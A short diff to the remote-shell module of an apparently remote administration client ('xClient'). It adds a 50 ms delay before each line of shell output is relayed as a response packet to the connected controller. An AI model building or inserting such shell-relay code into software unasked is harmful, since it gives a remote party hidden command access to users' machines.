@@ -39,7 +39,9 @@ namespace xClient.Core.RemoteShell
                 {
                     while (!reader.EndOfStream && _read)
                     {
-                        new Packets.ClientPackets.ShellCommandResponse(reader.ReadLine() + Environment.NewLine).Execute(Program.ConnectClient);
+                        var read = reader.ReadLine();
+                        Thread.Sleep(50);
+                        new Packets.ClientPackets.ShellCommandResponse(read + Environment.NewLine).Execute(Program.ConnectClient);
                     }
                 }
 
